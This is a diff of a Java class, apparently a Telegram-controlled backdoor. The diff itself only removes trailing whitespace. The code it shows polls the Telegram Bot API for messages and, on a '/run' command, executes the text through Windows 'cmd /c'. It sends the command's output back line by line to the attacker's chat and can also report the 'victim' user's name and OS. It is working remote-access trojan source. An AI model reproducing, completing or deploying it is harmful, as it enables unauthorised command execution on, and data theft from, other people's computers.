@@ -33,57 +33,57 @@ private final String tokenID;
         conn.setRequestMethod("POST");
         conn.connect();
         if(conn.getResponseCode()==200 || conn.getResponseCode()==201)
-        {        
-            System.out.println("success");            
+        {
+            System.out.println("success");
         }
-        
+
     }
     //sends message to bot returns message object of telegram
     private void sendUserAgent(Integer chatID) throws MalformedURLException, IOException
-    {        
+    {
         String OS=this.userName+" is using "+System.getProperty("os.name");
         String URLtoHit=url+tokenID+"/sendMessage?chat_id="+chatID+"&text="+OS;
         URL u=new URL(URLtoHit);
         HttpURLConnection conn=(HttpURLConnection) u.openConnection();
         conn.setDoInput(true);
         conn.setRequestMethod("GET");
-        conn.connect();         
+        conn.connect();
         if(conn.getResponseCode()==200 || conn.getResponseCode()==201)
         {
-            System.out.println("success");            
+            System.out.println("success");
         }
     }
     private void runCMD(Integer chatID,String command) throws MalformedURLException, IOException, InterruptedException
     {
-        Process p=Runtime.getRuntime().exec(new String[]{"cmd", "/c",command});   
+        Process p=Runtime.getRuntime().exec(new String[]{"cmd", "/c",command});
 
         BufferedReader stdInput = new BufferedReader(new InputStreamReader(p.getInputStream()));
         String temp=null;
         long curr=System.currentTimeMillis();
         try
         {
-            while ((temp = stdInput.readLine()) != null) 
-            {   
+            while ((temp = stdInput.readLine()) != null)
+            {
                 if(System.currentTimeMillis()-curr>=5000)
                     break;
                 String URLtoHit=url+tokenID+"/sendMessage?chat_id="+chatID+"&text="+temp;
-                
+
                 URL u=new URL(URLtoHit);
                 HttpURLConnection conn=(HttpURLConnection) u.openConnection();
-                                
+
                 conn.setDoInput(true);
-                
-                conn.setRequestMethod("GET");              
-                
-                conn.connect(); 
-                
+
+                conn.setRequestMethod("GET");
+
+                conn.connect();
+
                 if(conn.getResponseCode()==200 || conn.getResponseCode()==201)
                 {
-                    System.out.println("success");            
+                    System.out.println("success");
                 }
                 else
                     break;
-            } 
+            }
         }
         catch(Exception e)
         {
@@ -93,18 +93,18 @@ private final String tokenID;
             HttpURLConnection conn=(HttpURLConnection) u.openConnection();
             conn.setDoInput(true);
             conn.setRequestMethod("GET");
-            conn.connect();         
+            conn.connect();
             if(conn.getResponseCode()==200 || conn.getResponseCode()==201)
             {
-                System.out.println("success");            
-            }           
+                System.out.println("success");
+            }
         }
-        System.out.println("success");    
+        System.out.println("success");
     }
     private JSONObject getUpdates(Integer offset) throws MalformedURLException, IOException
-    {      
+    {
         String URLtoHit=url+tokenID+"/getUpdates"+"?offset="+offset;
-      
+
         URL u=new URL(URLtoHit);
         HttpURLConnection conn=(HttpURLConnection )u.openConnection();
         conn.setDoInput(true);
@@ -122,42 +122,42 @@ private final String tokenID;
             }
             br.close();
             json=new JSONObject(sb.toString());
-        } 
-        return json;        
+        }
+        return json;
     }
-    
+
     @Override
     public void run() {
         Integer offset=1,chatID;
         String messageReceived,victimUser;
         JSONObject response;
         JSONArray result_array;
-        
+
         while(true)
         {
             try {
                 response=getUpdates(offset);
                 result_array=response.getJSONArray("result");
-               
+
                 if(response==null)
-                    continue;                
-                
+                    continue;
+
                 if(result_array.length()==0)
-                    continue;                     
-                
+                    continue;
+
                 chatID=result_array.getJSONObject(0).getJSONObject("message").getJSONObject("chat").getInt("id");
-                                
+
                 messageReceived=result_array.getJSONObject(0).getJSONObject("message").getString("text");
                 offset=result_array.getJSONObject(0).getInt("update_id")+1;
-                
-                
+
+
                 if(messageReceived.length()<6)
                 {
                     sendErrorMessage(chatID);
                     continue;
                 }
-                
-                
+
+
                 if(messageReceived.length()>10)
                 {
                     if(messageReceived.substring(0,10).equals("/getUserOS"))
@@ -168,25 +168,24 @@ private final String tokenID;
                             continue;
                         }
                     }
-                                      
+
                 }
                 if(messageReceived.substring(0,4).equals("/run"))
-                {    
+                {
                     String command=messageReceived.substring(5);
                     runCMD(chatID,command);
-                }                
+                }
                 else
                 {
                     sendErrorMessage(chatID);
-                }   
+                }
 
-                
+
                 Thread.sleep(4000);
-            } 
+            }
             catch (Exception ex) {
-                   
                 Logger.getLogger(amanmjBot.class.getName()).log(Level.SEVERE, null, ex);
-            }         
-        }           
+            }
+        }
     }
 }
